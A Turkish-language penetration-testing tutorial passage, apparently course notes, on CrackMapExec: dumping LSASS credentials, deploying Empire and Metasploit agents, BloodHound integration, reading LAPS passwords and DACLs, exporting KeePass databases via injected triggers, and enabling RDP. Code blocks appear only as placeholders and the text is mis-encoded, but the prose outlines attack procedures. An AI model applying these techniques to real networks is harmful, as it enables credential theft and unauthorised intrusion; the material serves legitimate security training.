* [Lsassy](https://github.com/login-securite/lsassy) Python aracÄ±, bir dizi host Ã¼zerindeki kimlik bilgilerini remote olarak ayÄ±klamak iÃ§in kullanÄ±lÄ±r. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazÄ±sÄ± nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klamaktadÄ±r. Bu araÃ§, bir LSASS dump'Ä±ndaki gerekli baytlarÄ± remote okumak iÃ§in `Impacket` projesini ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz` kullanÄ±r.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluÅŸturmak iÃ§in Sysinternals'tan Microsoft `Procdump`'Ä± ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz`'Ä± kullanÄ±r.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracÄ±, **LSASS**'e ait kopyalanmÄ±ÅŸ **handle**'larÄ±n kullanÄ±mÄ±nÄ± gÃ¶stererek, aynÄ± **process**'in **gizlenmiÅŸ** bir bellek dump'Ä±nÄ± oluÅŸturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'Ä±nÄ± oluÅŸturan esnek bir araÃ§tÄ±r. **LSASS**'e bir **handle** aÃ§mak tespit edilebileceÄŸinden, **Nanodump** mevcut **handle**'larÄ± arayabilir. EÄŸer bir **handle** bulunursa, bunu kopyalayÄ±p **minidump** oluÅŸturmak iÃ§in kullanÄ±r. Ancak, bÃ¶yle bir **handle** bulunacaÄŸÄ±nÄ±n garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bÃ¶lgesi veya baÅŸka bir kaynak** ile etkileÅŸime geÃ§mesini saÄŸlayan **benzersiz bir tanÄ±mlayÄ±cÄ±dÄ±r**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bÃ¶lÃ¼mde bir bilgisayardan veya domain'den kimlik bilgilerini almak iÃ§in farklÄ± yÃ¶ntemler gÃ¶sterilmektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir C2 framework ile birlikte kullanÄ±mÄ± incelenecektir.

---


### Bir **C2 Framework** iÃ§inde **session**'larÄ± alma.

CrackMapExec ile ilginÃ§ olabilecek bir ÅŸey, birden fazla hedefi tehlikeye attÄ±ÄŸÄ±mÄ±zda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak Ã§alÄ±ÅŸmak isteyebiliriz. Her hedef makinede bir payload Ã§alÄ±ÅŸtÄ±rmak ve C2'mize bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz.

Bu bÃ¶lÃ¼mde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modÃ¼l ele alÄ±nacaktÄ±r. AyrÄ±ca farklÄ± bir C2 framework'Ã¼ kullanÄ±rsak bir alternatif de keÅŸfedeceÄŸiz.


### Empire

Web sitelerinde saÄŸlanan [kÄ±lavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'Ã¼ yÃ¼kleyerek baÅŸlayacaÄŸÄ±z


### Empire Server'Ä± Kurun ve BaÅŸlatÄ±n

{{CODE_BLOCK_176}}

Daha sonra Empire'Ä± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve ÅŸifre ile Ã§alÄ±ÅŸtÄ±rmamÄ±z gerekiyor. Biz `empireadmin` kullanÄ±cÄ± adÄ±nÄ± ve `asdasd123` ÅŸifresini kullanacaÄŸÄ±z! .


### Empire'Ä± Ã–zel KullanÄ±cÄ± AdÄ± ve Parola ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_177}}

ArdÄ±ndan, CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± ve Empire client yapÄ±landÄ±rma dosyasÄ±nÄ± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve parolayla eÅŸleÅŸecek ÅŸekilde dÃ¼zenlememiz gerekir.

CrackMapExec yapÄ±landÄ±rma dosyasÄ± varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seÃ§eneÄŸini `empireadmin` kullanÄ±cÄ± adÄ± ve `asdasd123` ÅŸifresiyle eÅŸleÅŸecek ÅŸekilde deÄŸiÅŸtirmemiz gerekiyor! . VarsayÄ±lan olarak, Empire local server `1337` portunda Ã§alÄ±ÅŸÄ±r. CrackMapExec yapÄ±landÄ±rma dosyasÄ±nda deÄŸiÅŸtirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


AynÄ± ÅŸeyi Empire yapÄ±landÄ±rma dosyasÄ± iÃ§in de yapmamÄ±z gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### Ä°nceleme

{{CODE_BLOCK_179}}


YapÄ±landÄ±rma dosyalarÄ± deÄŸiÅŸtirildikten sonra, Empire client ile Empire sunucusuna baÄŸlanmalÄ±yÄ±z

{{CODE_BLOCK_180}}

Åimdi listener'Ä± ayarlamamÄ±z gerekiyor ve host'u IP adresimize ve Port'u da aracÄ±nÄ±n baÄŸlanacaÄŸÄ± TCP 8001'e ayarlayacaÄŸÄ±z.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

ArtÄ±k listener'Ä±mÄ±z Ã§alÄ±ÅŸÄ±yor ve `empire_exec` modÃ¼lÃ¼ ile Empire'a bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz. AyarladÄ±ÄŸÄ±mÄ±z listener olan `LISTENER=http` seÃ§eneÄŸini eklememiz gerekiyor.


### CrackMapExec ModÃ¼lÃ¼nÃ¼ Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, PowerShell Empire'da yeni bir agent gÃ¶rmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

AynÄ± ÅŸeyi CrackMapExec modÃ¼lÃ¼ `web_delivery` kullanarak Metasploit Framework Ã¼zerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modÃ¼lÃ¼nÃ¼ yapÄ±landÄ±rmamÄ±z ve saÄŸlanan URL'yi CrackMapExec modÃ¼lÃ¼mÃ¼ze bir parametre olarak kullanmamÄ±z gerekir. Msfconsole'u baÅŸlatalÄ±m ve `web_delivery` handler'Ä±nÄ± yapÄ±landÄ±ralÄ±m


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapÄ±landÄ±rÄ±ldÄ±ktan sonra web_delivery modÃ¼lÃ¼nÃ¼ kullanabiliriz. `URL` ve `PAYLOAD` olmak Ã¼zere iki seÃ§eneÄŸi destekler. URL seÃ§eneÄŸini Metasploit tarafÄ±ndan saÄŸlanan URL ile ayarlamamÄ±z gerekir ve PAYLOAD seÃ§eneÄŸi seÃ§tiÄŸimiz payload mimarisine karÅŸÄ±lÄ±k gelir. EÄŸer `x64` kullanÄ±yorsak, `x64` varsayÄ±lan deÄŸer olduÄŸu iÃ§in bu seÃ§eneÄŸi atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. EÄŸer `32 bit` payload kullanÄ±yorsak `PAYLOAD=32` seÃ§eneÄŸini ayarlamamÄ±z gerekir. Åimdi bunu Ã§alÄ±ÅŸÄ±rken gÃ¶relim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum gÃ¶rmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

BaÅŸka bir C2 Framework kullanmak istediÄŸimizde, **Command Execution** bÃ¶lÃ¼mÃ¼nde bahsedilen (SMB, WinRM, SSH) yÃ¶ntemleri kullanarak aynÄ± sonucu elde edebiliriz. Ã–rneÄŸin, bir **PowerShell** payload'u oluÅŸturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip Ã§alÄ±ÅŸtÄ±rmak iÃ§in **-X** seÃ§eneÄŸiyle bir PowerShell komutu Ã§alÄ±ÅŸtÄ±rabiliriz. AyrÄ±ca, iÅŸlemi arka planda yÃ¼rÃ¼tmek iÃ§in **`--no-output`** seÃ§eneÄŸini seÃ§memiz gerekecektir.

Ã–rnek olarak Metasploit'i kullanalÄ±m ve modÃ¼lÃ¼ kullanmak yerine web_delivery payload'unda saÄŸlanan PowerShell script'ini kopyalamayÄ± deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bÃ¶lÃ¼m, CrackMapExec'i C2 Frameworks gibi diÄŸer bilgisayar korsanlÄ±ÄŸÄ± araÃ§larÄ±yla nasÄ±l kullanabileceÄŸimizi araÅŸtÄ±rÄ±yor. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in BloodHound ile nasÄ±l entegre edileceÄŸi incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldÄ±rganlar hem de savunmacÄ±lar tarafÄ±ndan alan gÃ¼venliÄŸini analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir araÃ§tÄ±r. AraÃ§, domain'den toplanan bÃ¼yÃ¼k miktarda veriyi alÄ±r. Ä°liÅŸkiyi gÃ¶rsel olarak temsil etmek ve geleneksel numaralandÄ±rma ile tespit edilmesi zor veya imkansÄ±z olan domain saldÄ±rÄ± yollarÄ±nÄ± belirlemek iÃ§in grafik teorisini kullanÄ±r. Bu bÃ¶lÃ¼mde Bloodhound'a aÅŸina olduÄŸunuzu varsayÄ±yoruz. 


### **BloodHound**'da **Owned** olarak iÅŸaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geÃ§irilmiÅŸ (owned) olarak iÅŸaretleyebiliriz. Bunu yapmak iÃ§in node'a saÄŸ tÄ±klayÄ±p **`Mark X as Owned`** seÃ§eneÄŸine tÄ±klamamÄ±z yeterlidir. Bu, ele geÃ§irdiÄŸimiz kullanÄ±cÄ±larÄ± ve bilgisayarlarÄ± takip etmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r, Ã¶zellikle bÃ¼yÃ¼k bir organizasyonla Ã§alÄ±ÅŸÄ±rken. AyrÄ±ca, **`Shortest Path from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan En KÄ±sa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan Domain Adminlerine En KÄ±sa Yollar) gibi bir BloodHound cypher sorgusu gerÃ§ekleÅŸtirmek istediÄŸimizde de kullanÄ±ÅŸlÄ±dÄ±r.

CrackMapExec'i, ele geÃ§irdiÄŸimiz herhangi bir user veya computer'Ä± BloodHound veritabanÄ±nda `owned` olarak iÅŸaretleyecek ÅŸekilde yapÄ±landÄ±rabiliriz. Bunu yapmak iÃ§in, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± aÅŸaÄŸÄ±daki seÃ§eneklerle deÄŸiÅŸtirmemiz gerekir:

* Bloodhound yapÄ±landÄ±rma seÃ§eneÄŸi `bh_enabled`'Ä± `True` olarak ayarlayÄ±n.
* `bh_uri`'yi Bloodhound veritabanÄ± `IP` adresimize ayarlayÄ±n.
* `bh_port`'u veritabanÄ± `portuna` ayarlayÄ±n
* Kimlik bilgilerini bloodhound veritabanÄ±yla eÅŸleÅŸecek ÅŸekilde ayarlayÄ±n: kullanÄ±cÄ± adÄ± `neo4j` ve ÅŸifre `asdasd123` (VeritabanÄ±nÄ±za karÅŸÄ±lÄ±k geleni kullandÄ±ÄŸÄ±nÄ±zdan emin olun).

YapÄ±landÄ±rma aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: BaÄŸlandÄ±ÄŸÄ±nÄ±z BloodHound veritabanÄ±na karÅŸÄ±lÄ±k gelen kullanÄ±cÄ± adÄ± ve parolayÄ± kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

### Bloodhound Verilerinin ToplanmasÄ±

BloodHound verilerini toplamak iÃ§in CrackMapExec kullanarak SharpHound'u Ã§alÄ±ÅŸtÄ±racak ve ardÄ±ndan dosyayÄ± saldÄ±rÄ± hostumuza aktaracaÄŸÄ±z.

### BloodHound verilerinin toplanmasÄ±

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Åimdi BloodHound'u aÃ§mamÄ±z ve verileri iÃ§e aktarmamÄ±z gerekiyor.


### BloodHound'da KullanÄ±cÄ±larÄ± Owned Olarak Ayarlama

Veriler iÃ§e aktarÄ±ldÄ±ktan sonra, `robert` kullanÄ±cÄ±sÄ± ile baÄŸlanmaya Ã§alÄ±ÅŸÄ±rsak, kullanÄ±cÄ±yÄ± BloodHound veritabanÄ±nda owned olunan olarak ayarlayacaktÄ±r.

### KullanÄ±cÄ± BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanÄ±cÄ±sÄ± olan bir makineyi tehlikeye atarsak da aynÄ± ÅŸey olacaktÄ±r. Bulunan tÃ¼m yeni kullanÄ±cÄ±larÄ± owned olarak ayarlayacaktÄ±r.

### Procdump ModÃ¼lÃ¼ ile KullanÄ±cÄ±larÄ± Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: TÃ¼m CrackMapExec seÃ§enekleri BloodHound veritabanÄ± ile senkronize olmayacaktÄ±r. Ã–rneÄŸin, `--ntds` veya `--lsa` seÃ§eneklerini denersek, kullanÄ±cÄ±larÄ± veritabanÄ±nda sahip olunan olarak iÅŸaretlemez, ancak `procdump` veya `lsassy` gibi modÃ¼ller kullanÄ±cÄ±larÄ± sahip olunan olarak iÅŸaretler.


### BloodHound'da BilgisayarlarÄ± Owned Olarak Ayarlama

YazÄ±m sÄ±rasÄ±nda, BloodHound entegrasyonu yalnÄ±zca user'larÄ± Owned olarak iÅŸaretlemektedir. Bir `computer` owned olarak iÅŸaretlemek istiyorsak, `bh_owned` modÃ¼lÃ¼nÃ¼ ve `neo4j` veritabanÄ±mÄ±zÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifresini kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, diÄŸer varsayÄ±lan deÄŸerler neo4j veritabanÄ±mÄ±zla eÅŸleÅŸtiÄŸi iÃ§in yalnÄ±zca `PASS` seÃ§eneÄŸini ekleyeceÄŸiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, bÃ¼yÃ¼k aÄŸlarla uÄŸraÅŸÄ±rken birÃ§ok seÃ§enek sunar ve mÃ¼ÅŸterilerimizle paylaÅŸmak istememiz durumunda veritabanÄ±nÄ± gÃ¼ncellemenin hÄ±zlÄ± bir yoludur. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec'te mevcut olan bazÄ± popÃ¼ler modÃ¼llerle Ã§alÄ±ÅŸacaÄŸÄ±z.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici ÅŸeylerden biri, modÃ¼ler olmasÄ± ve herkesin modÃ¼ller oluÅŸturmasÄ±na ve bunlarÄ± araca katkÄ±da bulunmasÄ±na izin vermesidir. CrackMapExec, exploit ve exploit sonrasÄ± gÃ¶revleri kolaylaÅŸtÄ±rmak iÃ§in iÅŸlemler gerÃ§ekleÅŸtirmemizi saÄŸlayan 50'den fazla modÃ¼le sahiptir. Bu bÃ¶lÃ¼mde LDAP ve SMB protokolleri iÃ§in bu modÃ¼llerden bazÄ±larÄ± incelenecektir.


### LDAP Protocol Modules

LDAP protokolÃ¼ yaygÄ±n olarak Domain Controller'lar ile etkileÅŸime geÃ§memizi ve onlardan bilgi almamÄ±zÄ± saÄŸlar. Active Directory'den ilginÃ§ bilgiler Ã§Ä±karmamÄ±zÄ± saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.


### **LDAP Module - get-network**

`get-network` modÃ¼lÃ¼ [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'Ä±  temel alÄ±r. VarsayÄ±lan olarak, Active Directory'deki herhangi bir kullanÄ±cÄ±, `zone transferine` benzer ÅŸekilde Domain veya Forest DNS bÃ¶lgelerindeki tÃ¼m DNS kayÄ±tlarÄ±nÄ± numaralandÄ±rabilir. Bu araÃ§, internal aÄŸlarÄ±n yeniden yapÄ±landÄ±rÄ±lmasÄ± amacÄ±yla bÃ¶lgedeki tÃ¼m DNS kayÄ±tlarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± saÄŸlar.

ModÃ¼lÃ¼ kullanmanÄ±n Ã¼Ã§ (3) yolu vardÄ±r:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adlarÄ±).

VarsayÄ±lan olarak, herhangi bir seÃ§enek belirtmezsek, modÃ¼l yalnÄ±zca IP adresini alacaktÄ±r. `ALL=true` seÃ§eneÄŸini seÃ§ersek, hem IP hem de domain adlarÄ±nÄ± alÄ±r ve `ONLY_HOSTS=true` olarak belirtirsek, yalnÄ±zca FQDN'yi alÄ±rÄ±z.


### DNS Sunucusundan (Record) KayÄ±tlarÄ± Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± zamanda, modÃ¼l **`adidnsdump`** aracÄ±yla bazÄ± farklÄ±lÄ±klar gÃ¶stermektedir. SonuÃ§lar, hesaplar arasÄ±nda farklÄ±lÄ±k gÃ¶sterebilir.


### LDAP Module - laps

Bir baÅŸka harika modÃ¼l de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e baÄŸlÄ± bilgisayarlarda local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL'ler tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca belirli kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya `parola sÄ±fÄ±rlama` talebinde bulunabilir. Laps modÃ¼lÃ¼ ile bir hesabÄ±n okuma eriÅŸimine sahip olduÄŸu tÃ¼m bilgisayarlarÄ± alabiliriz. Bir bilgisayarÄ± belirtmek iÃ§in `COMPUTER` seÃ§eneÄŸini de kullanabilir veya benzer ada sahip birkaÃ§ bilgisayarÄ± almak iÃ§in bir wildcard karakterle birlikte kullanabiliriz.


### LAPS ModÃ¼lÃ¼ ParolalarÄ±n AlÄ±nmasÄ±

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: KullanÄ±lan parola bir Ã¶rnektir. Hedef hostta Ã§alÄ±ÅŸmayacaktÄ±r

### LDAP ModÃ¼lÃ¼ - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'Ã¼ ile temsil edilen ve varsayÄ±lan olarak bir **user**'Ä±n bir **domain** iÃ§inde oluÅŸturabileceÄŸi **computer account** sayÄ±sÄ±nÄ± belirten bir **domain level attribute**'tÃ¼r.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazÄ± **attack** senaryolarÄ±nda **domain** iÃ§inde bir **machine** oluÅŸturmak gerekebilir, bu yÃ¼zden **account machine quota attribute**'Ã¼nÃ¼ **enumerate** etmek Ã¶nemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir baÅŸka harika modÃ¼l ise bir veya birden fazla object'in `DACL`'lerini okumamÄ±zÄ± ve dÄ±ÅŸa aktarmamÄ±zÄ± saÄŸlayan `daclread`'dir. Bu modÃ¼l Active Directory eriÅŸimini numaralandÄ±rmamÄ±zÄ± saÄŸlayacaktÄ±r. AÅŸaÄŸÄ±daki seÃ§eneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabÄ±nÄ±n tÃ¼m **ACE**'lerini okumak istiyoruz. Bunun iÃ§in **`TARGET`** seÃ§eneÄŸini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace KullanÄ±cÄ±sÄ±nÄ±n DACL'sini Oku

{{CODE_BLOCK_203}}


AyrÄ±ca belirli haklarÄ± da arayabiliriz, Ã¶rneÄŸin hangi **principal**'larÄ±n **DCSync** haklarÄ±na sahip olduÄŸunu. Bunun iÃ§in **`TARGET_DN`** seÃ§eneÄŸini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seÃ§eneÄŸini seÃ§memiz ve aramak istediÄŸimiz haklarÄ± **`RIGHTS`** seÃ§eneÄŸiyle belirlememiz gerekir.

### DCSync Rights'a Sahip KullanÄ±cÄ±larÄ± Arama

{{CODE_BLOCK_204}}



Ã‡Ä±ktÄ±da gÃ¶sterildiÄŸi gibi, `ACE[4]` `robert` kullanÄ±cÄ±sÄ±nÄ±n hedef domain'de `DCSync` haklarÄ±na sahip olduÄŸunu gÃ¶sterir.

LDAP'ta birkaÃ§ modÃ¼l daha kullanabiliriz. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolÃ¼nde daha fazla modÃ¼l mevcuttur. CrackMapExec modÃ¼lÃ¼nde yaptÄ±ÄŸÄ±mÄ±z ÅŸeylerin Ã§oÄŸu SMB protokolÃ¼nÃ¼ kullanÄ±r. Ä°lginÃ§ bilgiler elde etmemizi saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.

Not: SMB kullanan modÃ¼llerin Ã§oÄŸunun Ã§alÄ±ÅŸmasÄ± iÃ§in admin haklarÄ±na ( `Pwned!` ) ihtiyaÃ§ vardÄ±r.


### SMB ModÃ¼lleri - get_netconnections ve ioxidresolver

Bir aÄŸ pentesti Ã¼zerinde Ã§alÄ±ÅŸÄ±rken, sÃ¼rekli olarak daha fazla kaynaÄŸa veya aÄŸa eriÅŸim elde etmeye Ã§alÄ±ÅŸÄ±rÄ±z. CrackMapExec, daha Ã¶nce tehlikeye attÄ±ÄŸÄ±mÄ±z bir makineyi numaralandÄ±rmamÄ±za ve birden fazla aÄŸ yapÄ±landÄ±rmasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± belirlememize olanak tanÄ±yan bazÄ± modÃ¼llere sahiptir. `get_netconnections` ve `ioxidresolver` modÃ¼llerini kullanalÄ±m ve farklarÄ±nÄ± gÃ¶relim.

`get_netconnections` modÃ¼lÃ¼, aÄŸ baÄŸlantÄ±larÄ±nÄ± sorgulamak iÃ§in `WMI` kullanÄ±r. `IPv6` ve herhangi bir ikincil IP dahil olmak Ã¼zere tÃ¼m IP adreslerinin yanÄ± sÄ±ra domain adÄ±nÄ± da alÄ±r.


### get_netconnections Module

{{CODE_BLOCK_206}}


Ã–te yandan, `ioxidresolver` modÃ¼lÃ¼ IP adreslerini sorgulamak iÃ§in RPC kullanÄ±r. Ancak, bu modÃ¼l `IPv6` adreslerini iÃ§ermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: Ä°htiyaÃ§larÄ±mÄ±za en uygun olanÄ± seÃ§ebilmemiz iÃ§in bir modÃ¼lÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal aÄŸlarda adminler ve kullanÄ±cÄ±lar tarafÄ±ndan parolalarÄ± ve gizli bilgileri tek bir veritabanÄ±nda saklamak iÃ§in yaygÄ±n olarak kullanÄ±lan Ã¼cretsiz, aÃ§Ä±k kaynaklÄ± bir password manager'dÄ±r. Bir master password onu korur. Bir KeePass veritabanÄ± alÄ±rsak, onu aÃ§mak iÃ§in ÅŸifresine ihtiyacÄ±mÄ±z vardÄ±r.

### KeePass'i KeÅŸfetme

{{CODE_BLOCK_208}}

EÄŸer master parolaya sahip deÄŸilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafÄ±ndan geliÅŸtirilen ve veritabanÄ±nÄ± aÃ§Ä±k metin olarak dÄ±ÅŸa aktarmak iÃ§in KeePass'Ä±n triger sistemini kullanan bir teknik kullanmaktÄ±r. KeePass yapÄ±landÄ±rma dosyasÄ±nÄ±, veritabanÄ±nÄ± otomatik olarak aÃ§Ä±k metin olarak dÄ±ÅŸa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) iÃ§erecek ÅŸekilde deÄŸiÅŸtirir.

Bunu kullanmak iÃ§in beÅŸ (5) adÄ±ma ihtiyacÄ±mÄ±z var:

*  KeePass yapÄ±landÄ±rma dosyasÄ±nÄ± bulun. Biz bunu `keepass_discover` modÃ¼lÃ¼ ile yaptÄ±k.
 * `ACTION=ADD` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH` Ã¶ÄŸesini kullanarak trigger'Ä± yapÄ±landÄ±rma dosyasÄ±na ekleyin.

### KeePass YapÄ±landÄ±rma DosyasÄ±na Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapÄ±landÄ±rma yolu iÃ§in ters eÄŸik Ã§izgi (`/`) veya Ã§ift eÄŸik Ã§izgi (`\`) kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

* KullanÄ±cÄ±nÄ±n KeePass'i aÃ§masÄ±nÄ± ve master parolayÄ± girmesini bekleyin. Bu iÅŸlemi zorlamak iÃ§in `ACTION=RESTART` seÃ§eneÄŸini kullanarak KeePass.exe prosesini yeniden baÅŸlatabiliriz. Hedef makinede oturum aÃ§mÄ±ÅŸ Ã§ok sayÄ±da kullanÄ±cÄ± varsa, `USER=julio` gibi kullanÄ±cÄ± adÄ± ile `USER` seÃ§eneÄŸini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seÃ§eneÄŸini kullanarak export edilen veritabanÄ±nÄ± makinemize sorgulayÄ±n. Daha sonra ÅŸifre giriÅŸlerini aramak iÃ§in grep kullanabiliriz.


### Ele GeÃ§irilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapÄ±landÄ±rma dosyasÄ±nÄ± temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modÃ¼lÃ¼n her seÃ§eneÄŸini Ã¶ÄŸrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seÃ§eneÄŸin iyi yanÄ±, **extract_password** yÃ¶ntemini de iÃ§ermesidir; bu yÃ¶ntem **.xml** dosyasÄ±nda herhangi bir parola giriÅŸini arar ve konsola yazdÄ±rÄ±r.


### keeppass_trigger TÃœMÃœNÃœ Tek Komutta Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_214}}

Not: ModÃ¼l ÅŸifreyi yazdÄ±rÄ±rken sorun yaÅŸayabilir. Bir hata alabiliriz, ancak ÅŸifre `/tmp/export.xml` dosyasÄ±nda olacaktÄ±r, bÃ¶ylece manuel olarak alabiliriz.

### RDP'yi EtkinleÅŸtirme veya Devre DÄ±ÅŸÄ± BÄ±rakma

DeÄŸerlendirme yaparken yapmak isteyebileceÄŸimiz yaygÄ±n bir gÃ¶rev, RDP aracÄ±lÄ±ÄŸÄ±yla bir hedef makineye baÄŸlanmaktÄ±r. Bu, baÅŸka tÃ¼rlÃ¼ lateral hareket saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtiremediÄŸimiz veya standart bir protokol kullanarak radarÄ±n altÄ±ndan geÃ§mek istediÄŸimiz bazÄ± senaryolarda yararlÄ± olabilir.

BaÄŸlanmak istediÄŸimiz makinede RDP etkin deÄŸilse, buna izin vermek iÃ§in RDP modÃ¼lÃ¼nÃ¼ kullanabiliriz. `ACTION` seÃ§eneÄŸini ve ardÄ±ndan `enable` veya `disable` seÃ§eneklerini belirtmemiz gerekir.


### RDP'yi EtkinleÅŸtirme

{{CODE_BLOCK_215}}


SMB'de birkaÃ§ modÃ¼l daha vardÄ±r. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bÃ¶lÃ¼mde, ZeroLogon gibi bilinen gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanan diÄŸer SMB modÃ¼llerine bakacaÄŸÄ±z

### Vulnerability Scan Modules

SÄ±zma testi yaparken gerÃ§ekleÅŸtirdiÄŸimiz gÃ¼nlÃ¼k faaliyetlerden biri gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmeye Ã§alÄ±ÅŸmaktÄ±r. EÄŸer herhangi birini bulabilirsek, exploitation iÅŸi basit olabilir.

CrackMapExec, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmemizi saÄŸlayan bazÄ± modÃ¼ller iÃ§erir. Bu oturumda bunlardan bazÄ±larÄ±nÄ± inceleyeceÄŸiz.


### Environment'i Ayarlama

